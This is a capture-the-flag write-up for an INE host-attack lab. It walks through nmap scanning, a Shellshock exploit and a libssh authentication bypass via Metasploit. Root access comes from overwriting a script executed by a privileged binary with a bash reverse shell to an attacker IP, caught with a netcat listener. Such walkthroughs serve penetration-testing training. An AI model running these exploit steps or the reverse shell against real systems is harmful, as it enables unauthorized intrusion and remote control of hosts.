# Host & Network Penetration Testing: System-Host Based Attacks CTF 2
## Flag 1: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local

We begin with an Nmap scan across all ports, which reveals that only port 80 is open

    nmap -sS -O -p- -T4 target1.ine.local
    nmap -sS -O -p80 -sV -T4 target1.ine.local

A service scan reveals Apache 2.4.6 (Unix) on the target system.

We proceed with a Dirb scan to enumerate possible useful folders. It finds cgi-dbin folder and the home page of the site named browser.cgi.
This suggest we could attempt a Shellshocked vulnerability exploit.

    nmap target1.ine.local --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi"

Nmap reveals that the file browser.cgi is vulnerable to Shellshock.

We proceed with Metasploit:

    search shellshock
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    setg RHOSTS target1.ine.local
    setg TARGETURI /browser.cgi
    setg LHOST 192.164.224.2 
    run

**Note: If something is not working, try selecting another LPORT.**

We obtain a Meterpreter session and start exploring the target server, finding .flag.txt as our second flag.
Navigating to the root directory, we locate the first flag.

## Flag 2: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

This flag is found during the previous step.


## Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

Analyzing target 2, we scan it with Nmap. The scan leads us to port 22 and its service, libssh 0.8.3.

    nmap target2.ine.local -p- -T4 -sS
    nmap target2.ine.local -p22 -T4 -sS -sV

Using:
    searchsploit libssh

we discover that this particular version of libssh is vulnerable to unauthorized access.

We proceed with Metasploit:
search libssh
use auxiliary/scanner/ssh/libssh_auth_bypass - action: shell
setg RHOSTS target2.ine.local
set CMD /bin/bash -i
run
sessions -i 1

Navigating to the home folder of the user, we locate the third flag.


## Flag 4: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

Obtaining a root shell is not an easy task. However, there is an executable file in the user’s home folder named welcome, which the user is able to execute. This file runs another file, greetings, that is not accessible.

We overwrite greetings with a file containing the following string:
 
bash -i >& /dev/tcp/192.164.224.2/41234 0>&1

After using Netcat to open port on the attack machine to listen for communications:

nc -nlvp 41234

We execute welcome, that executes greetings, obtaining a root shell on the target machine.

Navigating to the root folder we find the last flag.
